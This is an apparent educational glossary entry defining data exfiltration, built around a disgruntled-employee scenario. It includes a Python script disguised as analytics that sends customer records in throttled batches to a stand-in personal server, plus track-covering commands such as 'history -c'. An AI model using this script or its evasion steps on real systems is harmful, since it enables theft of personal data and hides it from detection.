---
title: "Data Exfiltration"
termSlug: "data-exfiltration"
year: 2026
month: 1
monthName: "January"
day: 28
order: 19
source: "2026/jan-term.md"
sourceUrl: "https://github.com/swegrowthid/daily-term-SE-Growth/blob/main/2026/jan-term.md"
excerpt: "Data Exfiltration is the unauthorized transfer of data from a computer or network to an external location. It's essentially data theft—stealing sensitive information and sending it somewhere it doe..."
---
### Definition:

Data Exfiltration is the unauthorized transfer of data from a computer or network to an external location. It's essentially data theft—stealing sensitive information and sending it somewhere it doesn't belong, often without the owner's knowledge.

**Key Characteristics:**

- Unauthorized: Data leaves without permission
- Covert: Often hidden or disguised as normal traffic
- Malicious Intent: Goal is to steal valuable information
- Various Methods: Can be manual (insider) or automated (malware)

Simple Analogy:

```
🏦 Bank Robbery vs Data Exfiltration:

Physical Robbery:
Break into bank → Steal money → Leave with bags of cash
Everyone knows immediately!

Data Exfiltration:
Break into network → Copy data → Send out quietly
Nobody notices for months (or ever)!

Key Difference: Data can be copied, not just stolen.
You still have it, but now the attacker has it too.
```

### Example:

Scenario: Disgruntled Employee at E-commerce Company

```
The Setup:

- Employee has access to customer database
- Planning to leave company and start competing business
- Wants customer data for head start

The Attack
Week 1: Reconnaissance

-- Employee checks what data exists
SELECT COUNT(\*) FROM customers;
-- Result: 2,000,000 customers

SELECT \* FROM customers LIMIT 5;
-- Sees: email, name, phone, purchase history, addresses
Week 2: Exfiltration Begins

# Employee writes innocent-looking script

# Disguised as "analytics tool"

import psycopg2
import requests
import time

def "analyze_customer_data"(): # Fake function name # Connect to production database
conn = psycopg2.connect(
host="db.company.com",
database="production",
user="employee_id_1234",
password="password123"
)

    cursor = conn.cursor()

    # Extract all customer data in small batches (stay under radar)
    batch_size = 1000
    offset = 0

    while True:
        # Query looks normal - just selecting data
        cursor.execute(f"""
            SELECT email, name, phone, address, purchase_history
            FROM customers
            LIMIT {batch_size} OFFSET {offset}
        """)

        customers = cursor.fetchall()

        if not customers:
            break

        # Send to personal server (THE EXFILTRATION)
        # Using HTTPS to hide in normal web traffic
        requests.post(
            "https://my-personal-server.com/collect",
            json={"data": customers},
            headers={"X-Secret-Key": "abc123"}
        )

        offset += batch_size
        time.sleep(30)  # Slow down to avoid detection

    print("Analysis complete!")  # Looks innocent in logs

# Run during lunch break

analyze_customer_data()
Week 3: Covering Tracks

# Delete script

rm analyze_customer_data.py

# Clear bash history

history -c

# Resign from company

echo "Dear HR, I'm leaving for personal reasons..."
Detection Timeline

Day 1: Data stolen → No alerts
Day 30: Employee leaves → No connection made
Day 60: Competitor launches with stolen customer list
Day 90: Company investigates: "How did they get our customers?"
Day 120: Forensic analysis finds the exfiltration
Day 150: Lawsuit filed, but damage done
What Was Stolen

┌─────────────────────────────────────────┐
│ 2 Million Customer Records │
├─────────────────────────────────────────┤
│ • Full names │
│ • Email addresses │
│ • Phone numbers │
│ • Home addresses │
│ • Purchase history ($50M in total) │
│ • Credit card last 4 digits │
│ • Preferences and behavior data │
├─────────────────────────────────────────┤
│ Total Value: $10M+ (estimated) │
│ Transferred: 500 MB over 3 weeks │
│ Detection: 4 months after theft │
└─────────────────────────────────────────┘
```
